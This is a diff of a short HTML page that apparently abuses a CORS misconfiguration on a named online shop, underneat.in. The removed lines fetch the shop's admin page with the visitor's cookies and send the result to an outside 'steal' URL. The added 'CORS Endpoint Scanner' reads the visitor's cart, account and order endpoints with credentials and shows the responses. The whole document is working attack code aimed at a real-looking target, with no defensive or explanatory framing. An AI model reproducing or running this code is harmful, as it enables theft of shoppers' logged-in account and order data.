@@ -1,10 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>CORS Endpoint Scanner</h3>
+
 <script>
-fetch("https://underneat.in/admin", {
-    credentials: "include",
-    mode: "cors"
-})
-.then(r => r.text())
-.then(d => {
-    fetch("https://hi.com/steal?data=" + encodeURIComponent(d));
+const endpoints = [
+  "/cart.js",
+  "/cart",
+  "/account",
+  "/account/orders",
+  "/products/high-waist-tummy-tucker-shorts.js",
+  "/search/suggest.json?q=a"
+];
+
+endpoints.forEach(ep => {
+    fetch("https://underneat.in" + ep, {
+        credentials: "include",
+        mode: "cors"
+    })
+    .then(r => r.text())
+    .then(d => {
+        const block = document.createElement("pre");
+        block.textContent = ep + ":\n" + d + "\n\n";
+        document.body.appendChild(block);
+    })
+    .catch(e => console.log(ep, e));
 });
 </script>
+
+</body>
+</html>
